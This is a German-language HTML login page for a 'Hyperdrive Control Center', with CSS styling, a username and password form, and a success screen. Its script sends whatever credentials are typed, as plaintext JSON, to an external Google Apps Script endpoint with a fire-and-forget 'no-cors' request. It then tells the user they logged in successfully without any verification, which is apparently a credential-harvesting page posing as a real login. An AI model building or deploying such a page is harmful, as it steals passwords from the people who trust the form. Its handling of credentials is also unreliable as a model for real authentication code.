<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hyperdrive Control Center - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #0d1117;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 360px;
            padding: 40px 36px;
            background-color: #161b22;
            border: 1px solid #21262d;
            border-radius: 12px;
        }

        h1 {
            color: #e6edf3;
            font-size: 1.3em;
            font-weight: 600;
            text-align: center;
            margin-bottom: 28px;
            letter-spacing: 0.5px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            color: #8b949e;
            margin-bottom: 6px;
            font-size: 0.85em;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #30363d;
            border-radius: 6px;
            background-color: #0d1117;
            color: #e6edf3;
            font-size: 0.95em;
            transition: border-color 0.2s;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #388bfd;
        }

        .btn {
            display: block;
            width: 100%;
            background-color: #238636;
            color: #fff;
            padding: 11px;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            font-size: 0.95em;
            cursor: pointer;
            margin-top: 22px;
            transition: background-color 0.2s;
        }

        .btn:hover {
            background-color: #2ea44f;
        }

        /* Erfolgs-Screen */
        .success-screen {
            display: none;
            text-align: center;
        }

        .success-icon {
            width: 64px;
            height: 64px;
            background-color: #238636;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px auto;
            font-size: 1.8em;
        }

        .success-screen h2 {
            color: #e6edf3;
            font-size: 1.2em;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .success-screen p {
            color: #8b949e;
            font-size: 0.88em;
        }
    </style>
</head>
<body>
    <div class="container">

        <!-- Login Formular -->
        <div id="loginView">
            <h1>Hyperdrive Login</h1>

            <form id="loginForm">
                <div class="form-group">
                    <label for="username">Nutzername</label>
                    <input type="text" id="username" placeholder="Nutzername eingeben" required autocomplete="off">
                </div>

                <div class="form-group">
                    <label for="password">Passwort</label>
                    <input type="password" id="password" placeholder="Passwort eingeben" required>
                </div>

                <button type="submit" class="btn">Anmelden</button>
            </form>
        </div>

        <!-- Erfolgs-Screen -->
        <div class="success-screen" id="successView">
            <div class="success-icon">✓</div>
            <h2>Erfolgreich angemeldet</h2>
            <p>Willkommen im Hyperdrive Control Center.</p>
        </div>

    </div>

    <script>
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby2NOHdi-_cbNv4q5cZxOQBHZmPPrQW9IXcJ-JYITJqhoYSPL-mxnNKssMuCMO-_rDdBQ/exec";

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            fetch(SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: user, password: pass })
            });

            // Login-Ansicht ausblenden, Erfolgs-Screen anzeigen
            document.getElementById('loginView').style.display = 'none';
            document.getElementById('successView').style.display = 'block';
        });
    </script>
</body>
</html>
